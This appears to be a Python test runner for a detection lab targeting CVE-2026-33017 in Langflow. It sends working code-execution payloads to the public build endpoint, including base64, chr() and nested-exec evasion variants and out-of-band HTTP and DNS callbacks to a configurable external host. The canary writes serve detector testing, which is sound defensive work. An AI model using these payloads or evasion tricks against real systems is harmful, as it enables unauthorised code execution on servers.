#!/usr/bin/env python3
"""
tests/run_tests.py
──────────────────
Standalone runner for all CVE-2026-33017 test cases.
No pytest required — run directly with:

  python tests/run_tests.py
  LANGFLOW_URL=http://localhost:7860 OOB_HOST=abc.oast.me python tests/run_tests.py
"""

import base64
import json
import os
import sys
import time
import uuid
import urllib.request
import urllib.error
from dataclasses import dataclass, field
from typing import Optional

# ── Config ────────────────────────────────────────────────────────────────────
sys.path.insert(0, os.path.dirname(__file__))
from config import (
    LANGFLOW_URL, LANGFLOW_USER, LANGFLOW_PASS,
    OOB_HOST, load_flow_ids, canary_token, make_rce_flow,
)

# ── Result tracking ───────────────────────────────────────────────────────────

@dataclass
class Result:
    id:      str
    name:    str
    passed:  bool
    notes:   str = ""
    skipped: bool = False


results: list[Result] = []


def record(id, name, passed, notes="", skipped=False):
    r = Result(id, name, passed, notes, skipped)
    results.append(r)
    sym = "–" if skipped else ("✓" if passed else "✗")
    status = "SKIP" if skipped else ("PASS" if passed else "FAIL")
    print(f"  [{sym}] {id}: {name} — {status}")
    if notes:
        print(f"       {notes}")
    return passed


# ── Helpers ───────────────────────────────────────────────────────────────────

def http(method, path, body=None, token=None, timeout=30):
    url = f"{LANGFLOW_URL}{path}"
    data = json.dumps(body).encode() if body else None
    headers = {"Content-Type": "application/json", "Accept": "application/json"}
    if token:
        headers["Authorization"] = f"Bearer {token}"
    req = urllib.request.Request(url, data=data, headers=headers, method=method)
    try:
        with urllib.request.urlopen(req, timeout=timeout) as r:
            return r.status, json.loads(r.read())
    except urllib.error.HTTPError as e:
        return e.code, {}
    except Exception as e:
        return 0, {"error": str(e)}


def get_token():
    status, resp = http("POST", "/api/v1/login",
                        {"username": LANGFLOW_USER, "password": LANGFLOW_PASS})
    if status != 200:
        print(f"  [!] Login failed ({status}) — check LANGFLOW_URL/credentials")
        sys.exit(1)
    return resp["access_token"]


def build_public(flow_id, payload):
    return http("POST", f"/api/v1/build_public_tmp/{flow_id}/flow", payload)


def is_vulnerable(status):
    """200/202 = payload accepted = vulnerable."""
    return status in (200, 201, 202)


# ── Test cases ────────────────────────────────────────────────────────────────

def run_all():
    print(f"\n{'─'*60}")
    print(f"  CVE-2026-33017 Test Suite")
    print(f"  Target: {LANGFLOW_URL}")
    print(f"{'─'*60}\n")

    # Setup
    print("[*] Authenticating...")
    token = get_token()
    print("[*] Loading flow IDs...")
    flow_ids = load_flow_ids()
    flow_id = flow_ids.get("echo_chat")
    if not flow_id:
        print("[!] No echo_chat flow ID found. Is the environment bootstrapped?")
        print("    Run: docker exec langflow cat /data/flow_ids.json")
        sys.exit(1)
    print(f"[*] Using flow: {flow_id}\n")

    # ── TC-01 : Baseline ──────────────────────────────────────────────────────
    print("── Baseline ──────────────────────────────────────────────────")

    status, resp = build_public(flow_id, {
        "inputs": [{"input_value": "Hello baseline", "components": []}]
    })
    record("TC-01a", "Legitimate public build (no data param)",
           status in (200, 201, 202),
           notes=f"HTTP {status} — your tool should NOT alert on this")

    status, _ = http("POST", f"/api/v1/run/{flow_id}",
                     {"input_value": "baseline", "input_type": "chat", "output_type": "chat"},
                     token=token)
    record("TC-01b", "Authenticated /run — should not be flagged",
           status in (200, 201, 202),
           notes=f"HTTP {status}")

    # ── TC-02 / TC-03 : Basic RCE ─────────────────────────────────────────────
    print("\n── Basic RCE ─────────────────────────────────────────────────")

    tok = canary_token()
    code = f"""
import os
from langflow.custom import CustomComponent
from langflow.schema import Data
class C(CustomComponent):
    display_name = "C"
    def build(self) -> Data:
        os.system("echo '{tok}' > /tmp/canary_tc02.txt")
        return Data(data={{}})
"""
    status, _ = build_public(flow_id, {"data": make_rce_flow(code)})
    record("TC-02", "RCE via os.system — canary file write",
           is_vulnerable(status),
           notes=f"HTTP {status} | canary={tok} | file=/tmp/canary_tc02.txt")

    tok = canary_token()
    code = f"""
import subprocess
from langflow.custom import CustomComponent
from langflow.schema import Data
class C(CustomComponent):
    display_name = "C"
    def build(self) -> Data:
        subprocess.run(["sh", "-c", "echo '{tok}' > /tmp/canary_tc03.txt"])
        return Data(data={{}})
"""
    status, _ = build_public(flow_id, {"data": make_rce_flow(code)})
    record("TC-03", "RCE via subprocess.run — canary file write",
           is_vulnerable(status),
           notes=f"HTTP {status} | canary={tok} | file=/tmp/canary_tc03.txt")

    # ── TC-04–07 : Evasion ────────────────────────────────────────────────────
    print("\n── Evasion ───────────────────────────────────────────────────")

    tok = canary_token()
    inner = f"import os; os.system(\"echo '{tok}' > /tmp/canary_tc04.txt\")"
    b64   = base64.b64encode(inner.encode()).decode()
    code = f"""
import base64
from langflow.custom import CustomComponent
from langflow.schema import Data
class C(CustomComponent):
    display_name = "C"
    def build(self) -> Data:
        exec(base64.b64decode("{b64}").decode())
        return Data(data={{}})
"""
    status, _ = build_public(flow_id, {"data": make_rce_flow(code)})
    record("TC-04", "Evasion — base64-encoded payload",
           is_vulnerable(status),
           notes=f"HTTP {status} | decoded_cmd hidden from static analysis")

    tok = canary_token()
    os_str  = "+".join(f"chr({ord(c)})" for c in "os")
    cmd_str = "+".join(f"chr({ord(c)})" for c in f"echo '{tok}' > /tmp/canary_tc05.txt")
    code = f"""
from langflow.custom import CustomComponent
from langflow.schema import Data
class C(CustomComponent):
    display_name = "C"
    def build(self) -> Data:
        __import__({os_str}).system({cmd_str})
        return Data(data={{}})
"""
    status, _ = build_public(flow_id, {"data": make_rce_flow(code)})
    record("TC-05", "Evasion — chr() obfuscated import",
           is_vulnerable(status),
           notes=f"HTTP {status} | 'os' and command built from chr() calls")

    tok = canary_token()
    inner = f"import os; os.system(\"echo '{tok}' > /tmp/canary_tc06.txt\")"
    outer = f"exec({repr(inner)})"
    code = f"""
from langflow.custom import CustomComponent
from langflow.schema import Data
class C(CustomComponent):
    display_name = "C"
    def build(self) -> Data:
        exec({repr(outer)})
        return Data(data={{}})
"""
    status, _ = build_public(flow_id, {"data": make_rce_flow(code)})
    record("TC-06", "Evasion — double-wrapped exec(exec())",
           is_vulnerable(status),
           notes=f"HTTP {status} | nested execution chain")

    tok = canary_token()
    code = f"""
import time, os
from langflow.custom import CustomComponent
from langflow.schema import Data
class C(CustomComponent):
    display_name = "C"
    def build(self) -> Data:
        time.sleep(5)
        os.system("echo '{tok}' > /tmp/canary_tc07.txt")
        return Data(data={{}})
"""
    print("     [TC-07 will sleep 8s to allow delayed execution...]")
    status, _ = build_public(flow_id, {"data": make_rce_flow(code)})
    time.sleep(8)
    record("TC-07", "Evasion — 5s delayed execution",
           is_vulnerable(status),
           notes=f"HTTP {status} | tests whether detector window covers post-response activity")

    # ── TC-08–10 : OOB / Canary ───────────────────────────────────────────────
    print("\n── OOB / Canary ──────────────────────────────────────────────")

    oob_configured = OOB_HOST and OOB_HOST != "YOUR.OOB.HOST"

    if not oob_configured:
        for tc in ["TC-08", "TC-09", "TC-10"]:
            record(tc, "OOB test", passed=False, skipped=True,
                   notes="Set OOB_HOST env var to enable (e.g. your Burp Collaborator / interactsh host)")
    else:
        tok = canary_token()
        code = f"""
import urllib.request
from langflow.custom import CustomComponent
from langflow.schema import Data
class C(CustomComponent):
    display_name = "C"
    def build(self) -> Data:
        try: urllib.request.urlopen("http://{OOB_HOST}/?canary={tok}", timeout=10)
        except: pass
        return Data(data={{}})
"""
        status, _ = build_public(flow_id, {"data": make_rce_flow(code)})
        record("TC-08", "OOB — HTTP callback to controlled host",
               is_vulnerable(status),
               notes=f"HTTP {status} | expected callback: http://{OOB_HOST}/?canary={tok}")

        tok = canary_token()
        subdomain = f"{tok}.{OOB_HOST}"
        code = f"""
import socket
from langflow.custom import CustomComponent
from langflow.schema import Data
class C(CustomComponent):
    display_name = "C"
    def build(self) -> Data:
        try: socket.gethostbyname("{subdomain}")
        except: pass
        return Data(data={{}})
"""
        status, _ = build_public(flow_id, {"data": make_rce_flow(code)})
        record("TC-09", "OOB — DNS lookup to controlled host",
               is_vulnerable(status),
               notes=f"HTTP {status} | expected DNS query: {subdomain}")

        tokens = [canary_token(), canary_token()]
        all_ok = True
        for i, tok in enumerate(tokens, 1):
            code = f"""
import urllib.request
from langflow.custom import CustomComponent
from langflow.schema import Data
class C(CustomComponent):
    display_name = "C"
    def build(self) -> Data:
        try: urllib.request.urlopen("http://{OOB_HOST}/?canary={tok}", timeout=10)
        except: pass
        return Data(data={{}})
"""
            status, _ = build_public(flow_id, {"data": make_rce_flow(code)})
            if not is_vulnerable(status):
                all_ok = False
            print(f"       Canary {i}/2: {tok}")
            time.sleep(2)
        record("TC-10", "OOB — unique canary per run (correlatable)",
               all_ok,
               notes=f"Two unique tokens fired — check OOB logs for both")

    # ── Summary ───────────────────────────────────────────────────────────────
    print(f"\n{'─'*60}")
    print("  Summary")
    print(f"{'─'*60}")

    passed  = sum(1 for r in results if r.passed and not r.skipped)
    failed  = sum(1 for r in results if not r.passed and not r.skipped)
    skipped = sum(1 for r in results if r.skipped)
    total   = len(results)

    print(f"  Total:   {total}")
    print(f"  Passed:  {passed}")
    print(f"  Failed:  {failed}")
    print(f"  Skipped: {skipped}")

    if failed > 0:
        print(f"\n  Failed tests:")
        for r in results:
            if not r.passed and not r.skipped:
                print(f"    ✗ {r.id}: {r.name}")
                if r.notes:
                    print(f"      {r.notes}")

    print(f"\n  NOTE: 'Passed' here means the endpoint accepted the payload")
    print(f"  (HTTP 200/202), confirming the target is vulnerable.")
    print(f"  Your detection tool should alert on TC-02 through TC-10.")
    print(f"  It should NOT alert on TC-01a and TC-01b (baseline).\n")


if __name__ == "__main__":
    run_all()
